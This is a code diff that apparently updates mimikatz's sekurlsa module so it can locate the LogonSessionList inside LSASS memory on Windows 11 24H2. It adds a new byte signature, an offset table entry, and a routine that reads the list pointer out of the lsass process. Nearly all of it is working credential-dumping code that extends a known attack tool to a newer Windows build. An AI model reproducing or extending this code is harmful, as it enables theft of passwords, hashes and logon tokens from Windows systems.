@@ -20,6 +20,8 @@ BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b,
 BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
 BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
 BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};
+BYTE PTRN_WN11_24H2_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f, 0x84, 0xaa };
+
 KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
@@ -33,6 +35,7 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
 	{KULL_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
 	{KULL_M_WIN_BUILD_11_22H2,	{sizeof(PTRN_WN11_22H2_LogonSessionList), PTRN_WN11_22H2_LogonSessionList},	{0, NULL}, {27,  -4}},
+	{KULL_M_WIN_BUILD_11_24H2,	{sizeof(PTRN_WN11_24H2_LogonSessionList), PTRN_WN11_24H2_LogonSessionList},	{0, NULL}, {34,  -16}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WN51_LogonSessionList[]	= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
@@ -53,11 +56,38 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 PLIST_ENTRY LogonSessionList = NULL;
 PULONG LogonSessionListCount = NULL;
 
+
 BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
 {
-	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
-	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
+	PVOID* pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID*)
+		&LogonSessionListCount);
+	BOOL result = kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences, ARRAYSIZE(LsaSrvReferences),
+		(PVOID*)&LogonSessionList, pLogonSessionListCount, NULL, NULL);
+	if (result && cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_11_24H2)
+	{
+		KULL_M_MEMORY_SEARCH sMemory = { {{pLib->Informations.DllBase.address, cLsass->hLsassMem},
+		pLib->Informations.SizeOfImage}, NULL };
+		KULL_M_MEMORY_ADDRESS aLocal = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
+		PKULL_M_PATCH_GENERIC ref = kull_m_patch_getGenericFromBuild(LsaSrvReferences, ARRAYSIZE(LsaSrvReferences),
+			cLsass->osContext.BuildNumber);
+		if (ref)
+		{
+			aLocal.address = ref->Search.Pattern;
+			if (kull_m_memory_search(&aLocal, ref->Search.Length, &sMemory, FALSE))
+			{
+				LONG disp;
+				KULL_M_MEMORY_ADDRESS aSrc = { (PBYTE)sMemory.result + ref->Offsets.off0, cLsass->hLsassMem };
+				aLocal.address = &disp;
+				if (kull_m_memory_copy(&aLocal, &aSrc, sizeof(LONG)))
+				{
+					LogonSessionList = (PLIST_ENTRY)((PBYTE)pLib->Informations.DllBase.address + disp);
+				}
+			}
+		}
+	}
+	return result;
 }
+
 
 BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
 {
@@ -73,6 +103,7 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 		aLocalMemory.address = currentReference->Search.Pattern;
 		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
 		{
+
 			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
 			if(genericOffset1)
 				*genericOffset1 = currentReference->Offsets.off1;
@@ -82,7 +113,10 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 		#elif defined(_M_X64)
 			aLocalMemory.address = &offset;
 			if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
-				*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
+			{
+				*genericPtr = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
+				
+			}
 		#elif defined(_M_IX86)
 			aLocalMemory.address = genericPtr;
 			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
@@ -97,7 +131,9 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 			#elif defined(_M_X64)
 				aLocalMemory.address = &offset;
 				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
-					*genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
+				{
+					*genericPtr1 = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
+				}
 			#elif defined(_M_IX86)
 				aLocalMemory.address = genericPtr1;
 				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
